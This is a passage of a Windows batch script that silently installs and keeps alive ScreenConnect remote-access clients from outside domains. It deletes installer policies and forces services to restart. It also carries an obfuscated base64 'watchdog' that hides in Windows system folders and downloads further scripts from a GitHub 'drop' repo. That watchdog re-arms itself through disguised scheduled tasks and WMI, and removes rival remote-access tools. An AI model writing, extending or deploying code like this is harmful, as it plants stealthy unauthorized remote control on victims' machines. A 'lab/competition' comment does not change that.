  msiexec /i "%MSI_G%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_gryxa.log"
  set "GEXIT=!ERRORLEVEL!"
  echo gryxa_msiexec_exit=!GEXIT!>>"%LOG%"
  if "!GEXIT!"=="1618" (
    timeout /t 30 /nobreak >nul
    msiexec /i "%MSI_G%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_gryxa2.log"
    set "GEXIT=!ERRORLEVEL!"
    echo gryxa_msiexec_retry1618=!GEXIT!>>"%LOG%"
  )
  if "!GEXIT!"=="1618" (
    timeout /t 45 /nobreak >nul
    msiexec /i "%MSI_G%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_gryxa3.log"
    set "GEXIT=!ERRORLEVEL!"
    echo gryxa_msiexec_retry1618b=!GEXIT!>>"%LOG%"
  )
  timeout /t 10 /nobreak >nul
) else (
  echo gryxa_msi_fetch_FAIL>>"%LOG%"
)

sc query "%GRYXA%" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo gryxa_postinstall_repair>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP3%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  timeout /t 6 /nobreak >nul
)
sc config "%GRYXA%" start= auto >nul 2>&1
sc failure "%GRYXA%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%GRYXA%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%GRYXA%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%GRYXA%" >nul 2>&1

REM gryxa msiexec can disturb sevrz - nudge keepers
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc query "%ALT%" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP2%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

sc query "%GRYXA%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo gryxa_must_running_ok>>"%LOG%"
) else (
  echo gryxa_must_still_down>>"%LOG%"
  sc query "%GRYXA%" >>"%LOG%" 2>&1
)
exit /b 0

:NoMsiPolicy
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
exit /b 0

:ForceCopy
rem O20: copy over previously hardened (+h +s) targets - strip attrs first
attrib -h -s -r "%~2" >nul 2>&1
copy /y "%~1" "%~2" >nul 2>&1
if exist "%~2" exit /b 0
exit /b 1

:Extract
rem %1=tag %2=outfile - pulls base64 block embedded in this script (self-contained mode)
set "TAG=%~1"
set "OUT=%~2"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$raw=Get-Content -LiteralPath '%~f0' -Raw; $m=[regex]::Match($raw,'(?ms)%TAG%_BEGIN\s*(.+?)\s*%TAG%_END'); if($m.Success){ $b=($m.Groups[1].Value -replace '(?m)^::','' -replace '\s',''); try{ [IO.File]::WriteAllBytes('%OUT%',[Convert]::FromBase64String($b)) }catch{} }"
if exist "%OUT%" exit /b 0
exit /b 1

::B64_MON_BEGIN
QGVjaG8gb2ZmDQpyZW0g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQDQpyZW0gIE9XTl9NT04gIEJVSUxEIDIw
MjYwODAyTTI5DQpyZW0gIFBlcnNpc3RlbnQgd2F0Y2hkb2cgLSBpZGVudGl0eS1hd2FyZSAoYW50
aS1zaWduYXR1cmUpLCBtdXR1YWwNCnJlbSAgR3J5eGE6IG5vIHJlaW5zdGFsbCB3aGVuIFJ1bm5p
bmcgKHN0b3AgcGFuZWwgZHVwbGljYXRlcyk7IDhoIEZQIGRyaWZ0IG9ubHkuDQpyZW0gIEF1dGhv
cml6ZWQgaW50ZXJuYWwgZGVwbG95bWVudCAtIGxhYi9jb21wZXRpdGlvbiBzY29wZSBvbmx5Lg0K
cmVtIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkA0Kc2V0bG9jYWwgRW5hYmxlRGVsYXllZEV4cGFuc2lvbg0K
DQpzZXQgIktFRVBfRlA9NWY2MDEwNTc5ODUyZTUwNyINCnNldCAiQUxUX0ZQPWY4NjFjODE0MGQ0
NTM0MjciDQpzZXQgIkdSWVhBX0ZQPTk5MDgxOThlNjY4ZTQ3NTAiDQpzZXQgIldEPUM6XFByb2dy
YW1EYXRhXE1pY3Jvc29mdFxXaW5kb3dzXFdFUlxUZW1wXC53dWNhY2hlIg0Kc2V0ICJFVEw9Qzpc
UHJvZ3JhbURhdGFcTWljcm9zb2Z0XERpYWdub3Npc1xTdGF0ZVwuZXRsY2FjaGUiDQpzZXQgIkxP
Rz0lV0QlXG93bl9tb24ubG9nIg0Kc2V0ICJTVEFURT0lV0QlXG93bl9tb24uc3RhdGUiDQpzZXQg
IkhCRkxBRz0lV0QlXGhiLmZsYWciDQpzZXQgIkNVUkw9JVN5c3RlbVJvb3QlXFN5c3RlbTMyXGN1
cmwuZXhlIg0Kc2V0ICJURz1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veG5vYnVk
ZHkvZ2l0aHViLWRyb3AvbWFpbi90Z19yZXBvcnQucHMxP3Q9JVJBTkRPTSUlUkFORE9NJSINCnNl
dCAiVEcyPWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBt
YWluL3RnX3JlcG9ydC5wczE/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJPV05TRUM9aHR0cHM6
Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4vb3du
X3NlY3VyZS5jbWQ/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJPV05TRUMyPWh0dHBzOi8vY2Ru
LmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBtYWluL293bl9zZWN1cmUuY21k
P3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiT1dOTU9OPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJj
b250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL293bl9tb24uY21kP3Q9JVJBTkRP
TSUlUkFORE9NJSINCnNldCAiT1dOTU9OMj1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5v
YnVkZHkvZ2l0aHViLWRyb3BAbWFpbi9vd25fbW9uLmNtZD90PSVSQU5ET00lJVJBTkRPTSUiDQpz
ZXQgIk9XTkxJQj1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0
aHViLWRyb3AvbWFpbi9vd25fbGliLnBzMT90PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQgIk9XTkxJ
QjI9aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3hub2J1ZGR5L2dpdGh1Yi1kcm9wQG1haW4v
b3duX2xpYi5wczE/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJNU0lfVVJMPWh0dHBzOi8vdWku
c2V2cnouY29tL0Jpbi9TY3JlZW5Db25uZWN0LkNsaWVudFNldHVwLm1zaT9lPUFjY2VzcyZ5PUd1
ZXN0Ig0Kc2V0ICJNU0lfR1JZWEE9aHR0cHM6Ly91aS5ncnl4YS5jb20vQmluL1NjcmVlbkNvbm5l
Y3QuQ2xpZW50U2V0dXAubXNpP2U9QWNjZXNzJnk9R3Vlc3QiDQpzZXQgIk1TSV9QS0cxPWh0dHBz
Oi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL3Br
Zy5tc2kiDQpzZXQgIk1TSV9QS0cyPWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRk
eS9naXRodWItZHJvcEBtYWluL3BrZy5tc2kiDQpzZXQgIk1TST0lUHJvZ3JhbURhdGElXFNjcmVl
bkNvbm5lY3QuQ2xpZW50U2V0dXAubXNpIg0Kc2V0ICJNU0lDQUNIRT0lV0QlXHBrZy5tc2kiDQpz
ZXQgIk1TSV9HPSVQcm9ncmFtRGF0YSVcU2NyZWVuQ29ubmVjdC5Hcnl4YS5tc2kiDQpzZXQgIk1T
SUNBQ0hFX0c9JVdEJVxwa2dfZ3J5eGEubXNpIg0KDQppZiBub3QgZXhpc3QgIiVXRCUiIG1kICIl
V0QlIiAyPm51bA0KaWYgbm90IGV4aXN0ICIlTE9HJSIgdHlwZSBudWw+IiVMT0clIiAyPm51bA0K
DQpzZXQgIk1PTlZFUj1NMjkiDQpzZXQgIlBGODY9JVByb2dyYW1GaWxlcyh4ODYpJSINCnNldCAi
R1JZWEFfREVFUD0lV0QlXGdyeXhhX2RlZXAuZmxhZyINCnJlbSBsb2FkIGN1cnJlbnQgR3J5eGEg
RlAgKG1heSByb3RhdGUgd2hlbiBzZXJ2ZXIva2V5cyBjaGFuZ2UpDQppZiBleGlzdCAiJVdEJVxn
cnl4YS5jZmciIGZvciAvZiAidXNlYmFja3EgdG9rZW5zPTEsKiBkZWxpbXM9PSIgJSVLIGluICgi
JVdEJVxncnl4YS5jZmciKSBkbyBpZiAvSSAiJSVLIj09IkNVUlJFTlRfRlAiIHNldCAiR1JZWEFf
RlA9JSVMIg0KaWYgbm90IGRlZmluZWQgR1JZWEFfRlAgc2V0ICJHUllYQV9GUD05OTA4MTk4ZTY2
OGU0NzUwIg0KZm9yIC9mICJ0b2tlbnM9MS0zIGRlbGltcz0vICIgJSVhIGluICgiJWRhdGUlIikg
ZG8gc2V0ICJEVD0lZGF0ZSUgJXRpbWUlIg0KZWNoby4+PiIlTE9HJSINCmVjaG8g4pSA4pSAIHRp
Y2sgIURUISBbdmVyICVNT05WRVIlXSDilIDilIA+PiIlTE9HJSINCnNldCAiQ09VTlQ9MCINCnNl
dCAiSU5TVEFMTEVEPTAiDQpzZXQgIlBSSU1fT0s9MCINCnNldCAiQUxUX09LPTAiDQpzZXQgIkZP
UkVJR05fTEVGVD0wIg0Kc2V0ICJGT1JFSUdOX0xJU1Q9Ig0Kc2V0ICJNU0lFWElUPW5vdC1ydW4i
DQoNCnJlbSDilIDilIAgWzBdIHNpbmdsZS1mbGlnaHQgbXV0ZXggKHN0b3Agb3ZlcmxhcHBpbmcg
dGlja3MgcmFjaW5nIG1zaWV4ZWMpIOKUgOKUgA0Kc2V0ICJNVVRFWD0lV0QlXHRpY2subG9jayIN
CmlmIGV4aXN0ICIlTVVURVglIiAoDQogIGZvciAlJUEgaW4gKCIlTVVURVglIikgZG8gc2V0ICJM
T0NLQUdFPSUlfnRBIg0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1D
b21tYW5kICJpZigoVGVzdC1QYXRoICclTVVURVglJykgLWFuZCAoKChHZXQtRGF0ZSktKEdldC1J
dGVtIC1MaXRlcmFsUGF0aCAnJU1VVEVYJScgLUZvcmNlKS5MYXN0V3JpdGVUaW1lKS5Ub3RhbE1p
bnV0ZXMgLWx0IDgpKXsgZXhpdCAxIH0gZWxzZSB7IGV4aXQgMCB9IiA+bnVsIDI+JjENCiAgaWYg
ZXJyb3JsZXZlbCAxICgNCiAgICBlY2hvIHRpY2tfc2tpcHBlZF9tdXRleF9idXN5Pj4iJUxPRyUi
DQogICAgZW5kbG9jYWwNCiAgICBleGl0IC9iIDANCiAgKQ0KKQ0KZWNobyAlREFURSUgJVRJTUUl
ICVSQU5ET00lPiIlTVVURVglIg0KDQpyZW0g4pSA4pSAIHBlci1ob3N0IGlkZW50aXR5IChhbnRp
LXNpZ25hdHVyZSkg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIg
cG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5
cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBpbml0IC1Xb3JrRGlyICIlV0Ql
IiA+bnVsIDI+JjENCmlmIGV4aXN0ICIlV0QlXGlkZW50aXR5LmNmZyIgZm9yIC9mICJ1c2ViYWNr
cSB0b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXGlkZW50aXR5LmNmZyIpIGRvIHNl
dCAiJSVLPSUlTCINCmlmIG5vdCBkZWZpbmVkIFRBU0tfQSBzZXQgIlRBU0tfQT1XZXJRdWV1ZVN5
bmMiDQppZiBub3QgZGVmaW5lZCBUQVNLX0Igc2V0ICJUQVNLX0I9UGxhU2VydmVySGVhbHRoIg0K
aWYgbm90IGRlZmluZWQgVEFTS19DIHNldCAiVEFTS19DPVdkaUhvc3RQcm94eSINCmlmIG5vdCBk
ZWZpbmVkIFRBU0tfRCBzZXQgIlRBU0tfRD1UY3BJcENvbmZsaWN0UmVzIg0KaWYgbm90IGRlZmlu
ZWQgTU9fQSBzZXQgIk1PX0E9MiINCmlmIG5vdCBkZWZpbmVkIE1PX0Igc2V0ICJNT19CPTMiDQoN
CnJlbSDilIDilIAgW0FdIGF1dG8tdXBkYXRlIGNvcmUgZmlsZXMgKGJlc3QgZWZmb3J0KSDilIDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIANCmlmIG5v
dCBleGlzdCAiJUNVUkwlIiBzZXQgIkNVUkw9Y3VybC5leGUiDQoiJUNVUkwlIiAtTCAtLXNzbC1u
by1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlV0QlXHRnX3Jl
cG9ydC5uZXciICIlVEclIiA+bnVsIDI+JjENCmlmIG5vdCBleGlzdCAiJVdEJVx0Z19yZXBvcnQu
bmV3IiAiJUNVUkwlIiAtTCAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVX
RCVcdGdfcmVwb3J0Lm5ldyIgIiVURzIlIiA+bnVsIDI+JjENCmF0dHJpYiAtaCAtcyAtciAiJVdE
JVx0Z19yZXBvcnQucHMxIiA+bnVsIDI+JjENCmZpbmRzdHIgL0M6IlRHX1JFUE9SVCBCVUlMRCIg
IiVXRCVcdGdfcmVwb3J0Lm5ldyIgPm51bCAyPiYxICYmIGZvciAlJUYgaW4gKCIlV0QlXHRnX3Jl
cG9ydC5uZXciKSBkbyBpZiAlJX56RiBHVFIgMTUwMCBtb3ZlIC95ICIlV0QlXHRnX3JlcG9ydC5u
ZXciICIlV0QlXHRnX3JlcG9ydC5wczEiID5udWwgMj4mMQ0KZGVsIC9mIC9xICIlV0QlXHRnX3Jl
cG9ydC5uZXciID5udWwgMj4mMQ0KIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29ubmVj
dC10aW1lb3V0IDggLS1tYXgtdGltZSAzMCAtbyAiJVdEJVxvd25fc2VjdXJlLm5ldyIgIiVPV05T
RUMlIiA+bnVsIDI+JjENCmlmIG5vdCBleGlzdCAiJVdEJVxvd25fc2VjdXJlLm5ldyIgIiVDVVJM
JSIgLUwgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDMwIC1vICIlV0QlXG93bl9zZWN1
cmUubmV3IiAiJU9XTlNFQzIlIiA+bnVsIDI+JjENCmF0dHJpYiAtaCAtcyAtciAiJVdEJVxvd25f
c2VjdXJlLmNtZCIgPm51bCAyPiYxDQpmaW5kc3RyIC9DOiJPV05fU0VDVVJFIEJVSUxEIiAiJVdE
JVxvd25fc2VjdXJlLm5ldyIgPm51bCAyPiYxICYmIGZvciAlJUYgaW4gKCIlV0QlXG93bl9zZWN1
cmUubmV3IikgZG8gaWYgJSV+ekYgR1RSIDgwMCBtb3ZlIC95ICIlV0QlXG93bl9zZWN1cmUubmV3
IiAiJVdEJVxvd25fc2VjdXJlLmNtZCIgPm51bCAyPiYxDQpkZWwgL2YgL3EgIiVXRCVcb3duX3Nl
Y3VyZS5uZXciID5udWwgMj4mMQ0KIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29ubmVj
dC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVdEJVxvd25fbGliLm5ldyIgIiVPV05MSUIl
IiA+bnVsIDI+JjENCmlmIG5vdCBleGlzdCAiJVdEJVxvd25fbGliLm5ldyIgIiVDVVJMJSIgLUwg
LS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlV0QlXG93bl9saWIubmV3IiAi
JU9XTkxJQjIlIiA+bnVsIDI+JjENCmF0dHJpYiAtaCAtcyAtciAiJVdEJVxvd25fbGliLnBzMSIg
Pm51bCAyPiYxDQpmaW5kc3RyIC9DOiJPV05fTElCICBCVUlMRCIgIiVXRCVcb3duX2xpYi5uZXci
ID5udWwgMj4mMSAmJiBmb3IgJSVGIGluICgiJVdEJVxvd25fbGliLm5ldyIpIGRvIGlmICUlfnpG
IEdUUiAxNTAwIG1vdmUgL3kgIiVXRCVcb3duX2xpYi5uZXciICIlV0QlXG93bl9saWIucHMxIiA+
bnVsIDI+JjENCmRlbCAvZiAvcSAiJVdEJVxvd25fbGliLm5ldyIgPm51bCAyPiYxDQpyZW0gc2Vs
Zi11cGRhdGU6IGRvd25sb2FkIG5ldyBvd25fbW9uLCBhcHBseSBBRlRFUiB0aGlzIHRpY2sgKEJV
SUxELXZlcmlmaWVkKQ0Kc2V0ICJTRUxGX1VQRD0wIg0KIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2
b2tlIC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVdEJVxvd25fbW9uLm5l
eHQiICIlT1dOTU9OJSIgPm51bCAyPiYxDQppZiBub3QgZXhpc3QgIiVXRCVcb3duX21vbi5uZXh0
IiAiJUNVUkwlIiAtTCAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVXRCVc
b3duX21vbi5uZXh0IiAiJU9XTk1PTjIlIiA+bnVsIDI+JjENCmZpbmRzdHIgL0M6Ik9XTl9NT04g
IEJVSUxEIiAiJVdEJVxvd25fbW9uLm5leHQiID5udWwgMj4mMQ0KaWYgbm90IGVycm9ybGV2ZWwg
MSBmb3IgJSVGIGluICgiJVdEJVxvd25fbW9uLm5leHQiKSBkbyBpZiAlJX56RiBHVFIgMTUwMCAo
DQogIGZjIC9iICIlV0QlXG93bl9tb24ubmV4dCIgIiVXRCVcb3duX21vbi5jbWQiID5udWwgMj4m
MQ0KICBpZiBlcnJvcmxldmVsIDEgc2V0ICJTRUxGX1VQRD0xIg0KKQ0KaWYgIiVTRUxGX1VQRCUi
PT0iMCIgZGVsIC9mIC9xICIlV0QlXG93bl9tb24ubmV4dCIgPm51bCAyPiYxDQoNCnJlbSDilIDi
lIAgW0JdIHJlLWFybSBjaGFpbiAxOiBvd25lcnNoaXAtYXdhcmUgKG5vdCBleGlzdGVuY2Utb25s
eSkg4pSA4pSADQpyZW0gTDExL00yMjogUXVlcnktb25seSBza2lwcGVkIHJlYXJtIHdoZW4gV2lu
ZG93cyBidWlsdC1pbiB0YXNrcyBzaGFyZWQNCnJlbSBkZWZhdWx0IG5hbWVzIChEaWFnbm9zaXNc
U2NoZWR1bGVkIGV0Yy4pIC0+IG1vbiBuZXZlciByYW4sIG5vIGxvZy4NCmlmIGV4aXN0ICIlV0Ql
XG93bl9saWIucHMxIiAoDQogIGZvciAvZiAidXNlYmFja3EgZGVsaW1zPSIgJSVSIGluIChgcG93
ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFz
cyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiB0YXNrcy1lbnN1cmUgLVdvcmtEaXIg
IiVXRCUiIC1Nb25QYXRoICIlV0QlXG93bl9tb24uY21kImApIGRvICgNCiAgICBlY2hvIHRhc2tz
X2Vuc3VyZSAlJVI+PiIlTE9HJSINCiAgICBzZXQgIlRBU0tTX0VOU1VSRT0lJVIiDQogICkNCikN
CmlmIG5vdCBleGlzdCAiJUVUTCUiIG1rZGlyICIlRVRMJSIgPm51bCAyPiYxDQppZiBleGlzdCAi
JVdEJVxvd25fbW9uLmNtZCIgKA0KICBhdHRyaWIgLWggLXMgLXIgIiVFVEwlXGV0bF9tb24uY21k
IiA+bnVsIDI+JjENCiAgY29weSAveSAiJVdEJVxvd25fbW9uLmNtZCIgIiVFVEwlXGV0bF9tb24u
Y21kIiA+bnVsIDI+JjENCikNCg0KcmVtIOKUgOKUgCBbQjJdIHJlLWFybSBjaGFpbiAyIChXTUkg
c3Vic2NyaXB0aW9uKSBpZiBtaXNzaW5nIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KaWYg
ZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiICgNCiAgZm9yIC9mICJ1c2ViYWNrcSBkZWxpbXM9IiAl
JVIgaW4gKGBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Q
b2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHdhdGNoZG9nLWVu
c3VyZSAtV29ya0RpciAiJVdEJSIgLU1vblBhdGggIiVXRCVcb3duX21vbi5jbWQiYCkgZG8gc2V0
ICJXRF9TVEFURT0lJVIiDQogIGlmIC9JICIhV0RfU1RBVEUhIj09IlJFQVJNRUQiIGVjaG8gd2F0
Y2hkb2cgV01JIFJFQVJNRUQ+PiIlTE9HJSINCikNCg0KcmVtIOKUgOKUgCBbRV0gZXh0ZXJtaW5h
dGUgZm9yZWlnbiBTQyArIGRpc2FsbG93ZWQgUk1NIChCRUZPUkUgaGVhbC9pbnN0YWxsLA0KcmVt
ICAgICBzbyB0aGUgU0MgaW5zdGFsbGVyIGN1c3RvbSBhY3Rpb24gbmV2ZXIgY29sbGlkZXMgd2l0
aCByaXZhbHMpIOKUgOKUgA0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hlbGwg
LU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUg
IiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gZXh0ZXJtaW5hdGUgLVdvcmtEaXIgIiVXRCUiID4+
IiVMT0clIiAyPiYxDQp0aW1lb3V0IC90IDggL25vYnJlYWsgPm51bA0Kc2V0ICJGT1JFSUdOX0xF
RlQ9MCINCmZvciAvZiAidG9rZW5zPTIgZGVsaW1zPSgpIiAlJWEgaW4gKCdzYyBxdWVyeSBzdGF0
ZV49IGFsbCBefCBmaW5kc3RyIC9DOiJTRVJWSUNFX05BTUU6IFNjcmVlbkNvbm5lY3QgQ2xpZW50
IicpIGRvICgNCiAgc2V0ICJGUD0lJWEiDQogIHNldCAiRlA9IUZQOiA9ISINCiAgaWYgL0kgbm90
ICIhRlAhIj09IiVLRUVQX0ZQJSIgaWYgL0kgbm90ICIhRlAhIj09IiVBTFRfRlAlIiBpZiAvSSBu
b3QgIiFGUCEiPT0iJUdSWVhBX0ZQJSIgKA0KICAgIHNldCAvYSBDT1VOVCs9MQ0KICAgIHNldCAv
YSBGT1JFSUdOX0xFRlQrPTENCiAgICBzZXQgIkZPUkVJR05fTElTVD0hRk9SRUlHTl9MSVNUISFG
UCEgIg0KICAgIGVjaG8gZm9yZWlnbl9sZWZ0XyFGUCE+PiIlTE9HJSINCiAgKQ0KKQ0KDQpyZW0g
4pSA4pSAIFtDXSBoZWFsIFNjcmVlbkNvbm5lY3QgcHJpbS9hbHQg4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSADQpmb3IgL2YgInRva2Vucz0xLDIgZGVsaW1zPSgpIiAlJWEgaW4gKCdzYyBxdWVy
eSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIF58IGZpbmRzdHIgL0M6IlNFUlZJ
Q0VfTkFNRSInKSBkbyAoDQogIHNldCAiSU5TVEFMTEVEPTEiDQogIHNldCAiUFJJTVNUQVRFPSUl
YiINCikNCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgfCBmaW5k
ICJSVU5OSU5HIiA+bnVsDQppZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgc2V0ICJQUklNX09LPTEi
DQogIHNldCAvYSBDT1VOVCs9MQ0KKQ0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgl
QUxUX0ZQJSkiID5udWwgMj4mMQ0KaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgL2EgQ09VTlQrPTEN
CnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiB8IGZpbmQgIlJVTk5J
TkciID5udWwNCmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJBTFRfT0s9MSINCg0KaWYgIiVJTlNU
QUxMRUQlIj09IjEiIGlmICIlUFJJTV9PSyUiPT0iMCIgKA0KICBlY2hvIHN2YyBoZWFsIHJlc3Rh
cnQ+PiIlTE9HJSINCiAgbmV0IHN0YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAl
KSIgPm51bCAyPiYxDQogIHNjIHN0YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAl
KSIgPm51bCAyPiYxDQogIHRpbWVvdXQgL3QgNiAvbm9icmVhayA+bnVsDQogIHNjIHF1ZXJ5ICJT
Y3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQog
IGlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJQUklNX09LPTEiDQopDQpyZW0gTTE2OiBzdGlsbCBz
dG9wcGVkIC0+IHJlcGFpciB0aGUgUkVHSVNURVJFRCBwcm9kdWN0IChtc2lleGVjIC9mYSByZXN0
b3Jlcw0KcmVtIGJpbmFyaWVzICsgc3RhcnRzIHRoZSBzZXJ2aWNlOyBMNSBSZXBhaXItU0NTZXJ2
aWNlIGhhbmRsZXMgc3RvcHBlZCBzdmNzKQ0KaWYgIiVJTlNUQUxMRUQlIj09IjEiIGlmICIlUFJJ
TV9PSyUiPT0iMCIgKA0KICBlY2hvIHN2YyBlc2NhbGF0ZSByZXBhaXI+PiIlTE9HJSINCiAgaWYg
ZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJh
Y3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1B
Y3Rpb24gcmVwYWlyIC1GcCAiJUtFRVBfRlAlIiAtV29ya0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+
JjENCiAgdGltZW91dCAvdCA4IC9ub2JyZWFrID5udWwNCiAgc2MgcXVlcnkgIlNjcmVlbkNvbm5l
Y3QgQ2xpZW50ICglS0VFUF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwNCiAgaWYgbm90IGVy
cm9ybGV2ZWwgMSBzZXQgIlBSSU1fT0s9MSINCikNCnJlbSBNMTY6IG9ycGhhbmVkIHNlcnZpY2Ug
ZW50cnkgKHByb2R1Y3QgdW5yZWdpc3RlcmVkIC0gZWF0ZW4gYnkgYW4gU0MtZmFtaWx5DQpyZW0g
